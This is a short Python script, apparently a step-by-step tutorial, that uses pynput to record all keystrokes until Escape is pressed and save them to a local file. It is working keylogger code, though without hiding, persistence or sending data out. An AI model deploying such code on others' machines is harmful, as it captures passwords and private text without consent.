from pynput import keyboard

# Step 1: Initialize a list to store keystrokes
keystrokes = []

# Step 2: Define a function to handle key presses
def on_press(key):
    try:
        # Log normal alphanumeric keys
        keystrokes.append(key.char)
    except AttributeError:
        # Handle special keys like Shift, Enter, etc.
        keystrokes.append(f"[{key}]")

# Step 3: Define a function to handle key release
def on_release(key):
    # Stop the keylogger when Escape is pressed
    if key == keyboard.Key.esc:
        return False

# Step 4: Use a listener to monitor keyboard activity
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Step 5: Save the keystrokes to a file
with open("keylog.txt", "w") as file:
    file.write("".join(keystrokes))

